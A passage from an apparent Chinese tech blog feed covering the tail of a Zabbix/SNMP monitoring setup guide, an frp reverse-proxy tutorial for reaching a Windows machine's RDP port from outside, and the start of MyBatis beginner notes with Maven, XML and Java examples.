class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install mariadb-server -y</span><br><span class="line">systemctl enable --now mariadb</span><br></pre></td></tr></table></figure><p>8.初始化数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation  # 设置密码</span><br><span class="line">mysql -u root -p （输入数据库root密码进入数据库）</span><br><span class="line">create database zabbix character set utf8 collate utf8_bin; #创建数据库</span><br><span class="line">create user zabbix@localhost identified by &#x27;password&#x27;; #创建用户</span><br><span class="line">grant all privileges on zabbix.* to zabbix@localhost; #授权</span><br><span class="line">flush privileges;</span><br><span class="line">quit;</span><br></pre></td></tr></table></figure><p>9.导入数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -p zabbix</span><br></pre></td></tr></table></figure><p>10.修改配置文件zabbix_server.conf 里的数据库密码<code>vi /etc/zabbix/zabbix_server.conf</code></p><p>找到 DBPassword&#x3D;password ，将数据库密码改为zabbix数据库的密码，保存退出。</p><p>11.修改php时区，<code>vi /etc/opt/rh/rh-php72/php-fpm.d/zabbix.conf</code> 里的时区， 改成 Asia&#x2F;Shanghai</p><p>php_value[date.timezone] &#x3D; Asia&#x2F;Shanghai</p><blockquote><p>注意去掉前面的分号</p></blockquote><p>12.启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br><span class="line">systemctl enable zabbix-server zabbix-agent httpd rh-php72-php-fpm</span><br></pre></td></tr></table></figure><h3 id="snmp测试"><a href="#snmp测试" class="headerlink" title="snmp测试"></a>snmp测试</h3><p><img src="http://image.jh2ing.com/image-20220310161437826.png" alt="image-20220310161437826"></p><p>配置交换机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;H3C&gt;system-view </span><br><span class="line">[H3C]snmp-agent  </span><br><span class="line">[H3C]snmp-agent sys-info version v2c</span><br><span class="line">[H3C]snmp-agent community read public </span><br><span class="line">[H3C]snmp-agent trap enable</span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c -c public 192.168.73.100 system</span><br></pre></td></tr></table></figure><p><img src="http://image.jh2ing.com/image-20220310161548987.png" alt="image-20220310161548987"></p><blockquote><p>snmp安装 <code>yum -y install net-snmp net-snmp-utils</code></p></blockquote><p>zabbix监控</p><p>登录地址：<code>http://ip/zabbix/</code></p><blockquote><p>默认密码：Admin&#x2F;zabbix</p></blockquote><p>在配置选项选择主机创建主机</p><p><img src="http://image.jh2ing.com/image-20220320105806023.png" alt="image-20220320105806023"></p><p>在SNMP community一般使用宏来配置SNMP community值</p><p><img src="http://image.jh2ing.com/image-20220320110220092.png" alt="image-20220320110220092"></p><p>配置完成之后需要等待zabbix去检测，SNMP显示说明已经成功连接</p><p><img src="http://image.jh2ing.com/image-20220320110320622.png" alt="image-20220320110320622"></p><p>选择图形可自定义监控项</p><p><img src="http://image.jh2ing.com/image-20220320110451487.png" alt="image-20220320110451487"></p><p><img src="http://image.jh2ing.com/image-20220320121527949.png" alt="image-20220320121527949"></p><p>中文乱码解决</p><p>安装方式的不同，可能路径不太一样。</p><p>通过find命令找到自己的zabbix路径</p><p><img src="http://image.jh2ing.com/image-20220320124515110.png" alt="image-20220320124515110"></p><p>这里是<code>/usr/share/zabbix</code></p><p>查找defines.inc.php文件中的字体路径<code>vim /usr/share/zabbix/include/defines.inc.php</code></p><p><img src="http://image.jh2ing.com/image-20220320124820647.png" alt="image-20220320124820647"></p><p>从自己电脑的字体库中拷贝字体到此目录下</p><p><img src="http://image.jh2ing.com/image-20220320125031999.png" alt="image-20220320125031999"></p><p><img src="http://image.jh2ing.com/image-20220320124920425.png" alt="image-20220320124920425"></p><p>修改defines.inc.php文件并重新启动zabbix</p><p><img src="http://image.jh2ing.com/image-20220320125140415.png" alt="image-20220320125140415"></p><p><img src="http://image.jh2ing.com/image-20220320125222367.png" alt="image-20220320125222367"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frp内网穿透实现</title>
      <link href="/posts/32803/"/>
      <url>/posts/32803/</url>
      
        <content type="html"><![CDATA[<h3 id="1、环境配置"><a href="#1、环境配置" class="headerlink" title="1、环境配置"></a>1、环境配置</h3><p>frp是一个高性能的反向代理应用，可以帮助您轻松地进行内网穿透，对外网提供服务， 支持tcp, udp, http, https等协议类型，并且web服务支持根据域名进行路由转发。</p><p><img src="http://image.jh2ing.com/image-20220126141140473.png" alt="image-20220126141140473"></p><p><img src="http://image.jh2ing.com/image-20220126142547456.png" alt="image-20220126142547456"></p><ol><li>frp服务端和客户端通过8000建立连接；frps启动处于监听状态。</li><li>frpc启动后和frps建立连接，并告诉frps映射关系。</li><li>frps开始监听frpc需要映射的8080端口，如果有数据就发给frpc的3389端口。（frps和frpc建立一个管道，8080和3389为两端管道口）</li></ol><p>frps简单配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port=0.0.0.0</span><br><span class="line">bind_port=8000</span><br><span class="line">bind_udp_port=8001</span><br><span class="line"></span><br><span class="line"># 信息展示面板</span><br><span class="line">dashboard_port=</span><br><span class="line">dashboard_user=</span><br><span class="line">dashboard_pwd=</span><br><span class="line"></span><br><span class="line"># 认证</span><br><span class="line">token=</span><br><span class="line"></span><br><span class="line"># 日志</span><br><span class="line">log_file=frps.log</span><br><span class="line">log_level=info</span><br><span class="line">log_max_days=7</span><br></pre></td></tr></table></figure><p>frpc简单配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = </span><br><span class="line">server_port = 8000</span><br><span class="line"></span><br><span class="line">token = </span><br><span class="line"></span><br><span class="line">[3389]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 8080</span><br></pre></td></tr></table></figure><p>详情配置信息请参考官方模板</p><blockquote><p><a href="https://www.wlphp.com/?post=170">https://www.wlphp.com/?post=170</a></p></blockquote><h3 id="2、运行优化"><a href="#2、运行优化" class="headerlink" title="2、运行优化"></a>2、运行优化</h3><p>服务器和客户端分别运行</p><p><code>frpc -c frpc.ini</code></p><p><code>frps -c frps.ini</code></p><blockquote><p>注意：防火墙策略需要放行所需端口</p></blockquote><p><strong>开机启动（只针对Windows）</strong></p><p>编辑vbs脚本</p><figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">createobject</span>(<span class="string">&quot;wscript.shell&quot;</span>).run <span class="string">&quot;frpc.exe -c frpc.ini&quot;</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>win+r 运行 </p><p><code>shell:startup</code></p><p>把vbs脚本快捷方式加入可实现</p><blockquote><p>此方法只有登录用户之后才会运行</p></blockquote><p><strong>1、加入定时任务</strong></p><p><strong>2、新建服务实现开机后不需要登录即可运行程序</strong></p><p>所需instsrv+srvany软件来实现注册服务，通过实验发现sc无法完成</p><p>下载链接</p><blockquote><p>链接：<a href="https://pan.baidu.com/s/16Mg1OF8kaZ38dPmI3hcncQ">https://pan.baidu.com/s/16Mg1OF8kaZ38dPmI3hcncQ</a><br>提取码：1lf2 </p></blockquote><p>把两个文件放入C:\Windows\System32中执行</p><p><code>instsrv ServiceName C:\Windows\System32\srvany.exe</code></p><p><code>ServiceName</code>自定义服务名</p><blockquote><p>注意：如果此命令无法执行，请将srvany.exe放入C:\Windows\SysWOW64中</p></blockquote><p>执行成功之后打开注册表</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</p><p>在Services下找到自己定义的服务名<code>ServiceName</code></p><p>如果该服务名下没有Parameters项目，则对服务名称项目右击新建项，名称为Parameters，然后定位到Parameters项，新建以下几个字符串值。</p><ul><li>名称 <code>Application</code> 值为你要作为服务运行的程序地址。</li><li>名称 <code>AppDirectory</code> 值为你要作为服务运行的程序所在文件夹路径。</li><li>名称 <code>AppParameters </code>值为你要作为服务运行的程序启动所需要的参数。</li></ul><p>如图所示</p><p><img src="http://image.jh2ing.com/image-20220126155723375.png" alt="image-20220126155723375"></p><p>启动此服务便可实现内网穿透。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frp </tag>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis笔记（上）</title>
      <link href="/posts/34857/"/>
      <url>/posts/34857/</url>
      
        <content type="html"><![CDATA[<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><h3 id="1-1-什么是Mybatis"><a href="#1-1-什么是Mybatis" class="headerlink" title="1.1 什么是Mybatis"></a>1.1 什么是Mybatis</h3><ul><li>Mybatis是一款优秀的<strong>持久层框架</strong>。</li><li>支持定制化SQL、存储过程以及高级映射。</li><li>避免了几乎所有的JDBC代码和手动设置参数以及获取结果集。</li><li>Mybatis可以使用简单的XML或注解来配置和映射原生类型、接口和Java的POJO（Plain Old Java Object，普通老式Java对象）为数据库中的记录。</li><li>MyBatis是apache的一个开源项目iBats。</li></ul><p>如何获取Mybatis？</p><ul><li>maven仓库</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>Github：<a href="https://github.com/mybatis/mybatis-3/releases">https://github.com/mybatis/mybatis-3/releases</a></li><li>中文文档：<a href="https://mybatis.org/mybatis-3/zh/index.html">https://mybatis.org/mybatis-3/zh/index.html</a></li></ul><h3 id="1-2、持久化"><a href="#1-2、持久化" class="headerlink" title="1.2、持久化"></a>1.2、持久化</h3><p>数据持久化</p><ul><li>持久化就是将程序的数据在持久化状态和瞬间状态转化的过程。</li><li>内存：<strong>断电即失。</strong></li><li>数据库（JDBC），IO文件持久化。</li><li>生活：冷藏。</li></ul><p><strong>为什么需要持久化？</strong></p><ul><li>有一些对象不能让他丢掉。</li></ul><h3 id="1-3、持久层"><a href="#1-3、持久层" class="headerlink" title="1.3、持久层"></a>1.3、持久层</h3><p>学过Dao层、Service层、Controller层…</p><ul><li>完成持久化工作的代码块。</li><li>层界限明显。</li></ul><h3 id="1-4、为什么需要Mybatis？"><a href="#1-4、为什么需要Mybatis？" class="headerlink" title="1.4、为什么需要Mybatis？"></a>1.4、为什么需要Mybatis？</h3><ul><li>帮助程序员将数据存入到数据库中。</li><li>传统JDBC代码太复杂。简化、框架、自动化。</li><li>更容易上手。<strong>技术没有高低之分</strong></li><li><strong>使用的人比较多</strong></li></ul><h2 id="2、第一个Mybatis程序"><a href="#2、第一个Mybatis程序" class="headerlink" title="2、第一个Mybatis程序"></a>2、第一个Mybatis程序</h2><p><strong>思路：搭建环境–&gt;导入Mybatis–&gt;编写代码–&gt;测试</strong></p><h3 id="2-1、环境搭建"><a href="#2-1、环境搭建" class="headerlink" title="2.1、环境搭建"></a>2.1、环境搭建</h3><p>搭建数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(</span><br><span class="line">`id` INT PRIMARY KEY,</span><br><span class="line">`name` CHAR(18),</span><br><span class="line">`passwd` CHAR(18)</span><br><span class="line">)ENGINE=INNODB DEFAULT CHARSET=utf8;</span><br><span class="line"></span><br><span class="line">INSERT INTO users(id,NAME,passwd) VALUES(1,&#x27;aaa&#x27;,&#x27;123&#x27;),(2,&#x27;bbb&#x27;,&#x27;456&#x27;),(3,&#x27;ccc&#x27;,&#x27;789&#x27;);</span><br><span class="line"></span><br><span class="line">SELECT * FROM users;</span><br></pre></td></tr></table></figure><p>新建项目</p><p>1.新建一个Maven项目</p><p>2.删除src文件夹</p><p>3.导入maven依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--导入依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mysql驱动--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.46<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Mybatis--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--Junit--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2、创建一个模块"><a href="#2-2、创建一个模块" class="headerlink" title="2.2、创建一个模块"></a>2.2、创建一个模块</h3><ul><li>编写mybatis的核心配置文件</li></ul><blockquote><p><font color="red">注意在xml下，url里的&amp;需要转义</font></p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/test?useSSL=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf-8&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>编写mybatis工具类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// qlSessionFactory--&gt;sqlSession</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisUtils</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory sqlSessionFactory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取sqlSessionFactory</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">            sqlSessionFactory = <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取sqlSession</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title function_">getSqlSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sqlSessionFactory.openSession();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-3、编写代码"><a href="#2-3、编写代码" class="headerlink" title="2.3、编写代码"></a>2.3、编写代码</h3><ul><li>实体类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String passwd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(<span class="type">int</span> id, String name, String passwd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.passwd = passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPasswd</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPasswd</span><span class="params">(String passwd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.passwd = passwd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, passwd=&#x27;&quot;</span> + passwd + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Dao接口</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    List&lt;User&gt; <span class="title function_">getUserList</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接口实现类由原来的UserDaoImp转变成一个Mapper配置文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--绑定一个对应的Dao/Mapper接口--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.jh2ng.dao.UserDao&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--id对应方法名，结果类型指向对应实体类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUserList&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.jh2ng.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from users;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-4、测试"><a href="#2-4、测试" class="headerlink" title="2.4、测试"></a>2.4、测试</h3><ul><li>junit</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserDaoTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">// 获取sqlSession对象</span></span><br><span class="line">        <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> MybatisUtils.getSqlSession();</span><br><span class="line">        <span class="comment">// getMapper</span></span><br><span class="line">        <span class="type">UserDao</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserDao.class);</span><br><span class="line">        List&lt;User&gt; userList = 